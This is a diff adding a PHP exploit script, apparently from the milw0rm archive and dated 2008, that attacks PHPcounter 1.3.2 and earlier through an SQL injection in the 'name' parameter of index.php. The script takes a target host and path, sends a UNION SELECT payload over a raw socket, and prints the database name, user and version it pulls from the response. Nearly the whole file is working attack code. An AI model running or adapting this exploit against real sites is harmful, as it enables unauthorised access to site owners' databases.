@@ -1,0 +1,48 @@
+#!/usr/bin/php -q
+<?php
+
+// PHPcounter <= 1.3.2 Remote SQL Injection Exploit
+// Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
+// Discovered On: 28/09/2008
+// Download: http://sourceforge.net/projects/phpcounter/
+
+error_reporting(0);
+
+$host = $argv[1] or banner();
+$path = $argv[2] or banner();
+$host = str_replace('http://',NULL,$host);
+
+$isql = "'union select 0,0,0,concat(0x24,database(),0x3a,user(),0x3a,version(),0x24)'/*";
+$isql = urlencode($isql);
+
+function banner() {
+  echo "[?] Usage: php $argv[0] http://example.com /cms\r\n";
+  exit(0);
+}
+
+if(!$sock = fsockopen($host,80)) {
+  die("Socket Error\r\n");
+}
+
+$data .= "GET /$path/index.php?name=$isql HTTP/1.1\r\n";
+$data .= "Host: $host\r\n";
+$data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+$data .= "Connection: close\r\n\r\n";
+
+fputs($sock,$data);
+
+while(!feof($sock)) {
+  $content .= fgets($sock);
+} fclose($sock); 
+
+
+if(preg_match('/\$(.+?)\$/',$content,$out)) {
+  print "[+] $out[1]\r\n";
+}
+else {
+  echo "[!] Exploit Failed!\n";
+}
+
+?>
+
+# milw0rm.com [2008-09-28]
